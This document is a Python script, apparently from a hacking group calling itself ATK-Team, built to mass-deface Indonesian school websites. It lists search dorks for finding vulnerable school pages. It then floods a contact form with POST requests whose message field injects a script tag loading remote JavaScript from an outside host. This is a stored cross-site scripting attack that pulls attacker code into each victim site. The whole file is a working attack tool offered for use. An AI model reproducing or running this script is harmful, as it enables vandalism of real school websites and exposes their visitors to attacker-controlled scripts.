import requests
import os
import random
c = 0
def get_random_user_agent(file_path):
    with open(file_path, 'r') as f:
        user_agents = f.read().splitlines()
        return random.choice(user_agents)

file_path = 'ua.txt'

os.system("clear")
print("Welcome Lizard! ATK-Team Auto Deface Sch.id\nMethod Hubungi.php (SCH.ID)")
print("""
[Dorks: inurl: Aplikasi Sistem Kelulusan site:sch.id ]
[Dork-Asik: inurl: asik site:sch.id ]
[Dork-Hubungi: inurl: admin/hubungi.php ]
~░█████╗░████████╗██╗░░██╗
~██╔══██╗╚══██╔══╝██║░██╔╝
~███████║░░░██║░░░█████═╝░
~██╔══██║░░░██║░░░██╔═██╗░
~██║░░██║░░░██║░░░██║░╚██╗
~╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝
Made by @Lizardpredator   t.me/lizardofficial
""")
urli = input("『✦』𝙻𝚒𝚗𝚔 𝙴𝚡𝚊𝚖𝚙𝚕𝚎: kelulusan.sman4-bjm.sch.id\n𝚃𝚊𝚛𝚐𝚎𝚝 𝙻𝚒𝚗𝚔┈➤  ")
spams = int(input("『✦』𝚃𝚑𝚛𝚎𝚊𝚍/𝚁𝚎𝚙𝚎𝚊𝚝 (100)\n╰┈➤ "))
print(f"""
-------------------------------------------
『✦』 Spamming Thread Deface Logs
『✦』 Target: {urli}
『✦』 Thread: {spams}
t.me/lizardofficial
-------------------------------------------
VIP Tools ^_^
""")

url = (f'https://{urli}:443/index.php?page=kirimpesan')

atk = ['atkteam@hackers.lol', 'a_lizard@atk.com', 'atk.is.here.xyz', 'a_catnonymus', 'a_corruptedatk.atkteam']
atkn = ['a_fuck-you', 'a_omaewamushinderu', 'a_pokemongamesHAHAHAHA', 'a_unogamesREVERSED', 'A_atk-uno', 'a_keepup-on-my-tracks-atk']
aseli = ['<script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~CA31BMEMALH8L"></script>']
two = ['<script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~/61O5UQCHMIKSY"></script>']
three = ['<script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~/7MG17K2DXR3M1"></script>']
four = ['<script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~/MZAHVG8DTGJT7"></script>']
five = ['<script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~/JLXH1OGQK8QWB"></script>']
headers = {
    'User-Agent': get_random_user_agent(file_path)
}
payload = {
    'nama': random.choice(atkn),
    'email': random.choice(atk),
    'pesan': five,
    'submit': 'Kirim Pesan'
}

# Loop untuk mengirim JSO
for i in range(spams):
    response = requests.post(url, headers=headers, data=payload)
    c += 1
    print(f"Count: {c}")
    
print("End")
